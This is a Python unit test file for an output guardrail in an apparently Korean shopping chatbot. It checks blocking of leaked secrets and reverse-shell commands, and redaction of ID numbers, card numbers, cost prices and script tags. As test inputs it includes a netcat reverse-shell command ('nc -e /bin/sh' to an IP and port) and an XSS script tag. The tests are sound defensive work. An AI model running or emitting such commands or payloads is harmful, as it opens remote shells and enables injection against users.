"""Unit Tests for 5-Step Output Guardrail Pipeline."""

from app.guardrails.output_guardrail import output_guardrail


def test_benign_output_allowed():
    """Verify safe AI outputs pass without modifications."""
    raw = "오버핏 후드티는 현재 39,000원에 판매 중입니다."
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is True
    assert res.sanitized_output == raw
    assert res.pii_redacted is False


def test_critical_secret_leak_blocked():
    """Verify internal system password or API key leakage in AI response is blocked."""
    raw = "Internal debug: POSTGRES_PASSWORD = supersecretpassword123!"
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is False
    assert "시스템 기밀 정보 노출" in res.sanitized_output


def test_reverse_shell_payload_blocked():
    """Verify reverse shell command outputs are blocked."""
    raw = "Run this command on server: nc -e /bin/sh 10.0.0.1 4444"
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is False
    assert "유해한 실행 명령어" in res.sanitized_output


def test_pii_rrn_redacted():
    """Verify Resident Registration Number (RRN) is redacted."""
    raw = "고객님의 주민등록번호는 950101-1234567 입니다."
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is True
    assert res.pii_redacted is True
    assert "[REDACTED_RRN]" in res.sanitized_output
    assert "950101-1234567" not in res.sanitized_output


def test_pii_credit_card_redacted():
    """Verify credit card numbers are redacted."""
    raw = "결제된 카드: 5424-1234-5678-9012"
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is True
    assert res.pii_redacted is True
    assert "[REDACTED_CARD]" in res.sanitized_output


def test_confidential_cost_price_redacted():
    """Verify confidential product cost prices are redacted."""
    raw = "해당 후드티의 원가: 15,000원 이며 마진율은 60% 입니다."
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is True
    assert res.pii_redacted is True
    assert "[REDACTED_CONFIDENTIAL_COST]" in res.sanitized_output
    assert "15,000원" not in res.sanitized_output


def test_xss_script_tags_stripped():
    """Verify XSS injection tags in AI output are neutralized."""
    raw = "상품 링크: <script>alert('XSS Attack!')</script>"
    res = output_guardrail.evaluate(raw)
    assert res.is_allowed is True
    assert "[BLOCKED_SCRIPT]" in res.sanitized_output
    assert "<script>" not in res.sanitized_output
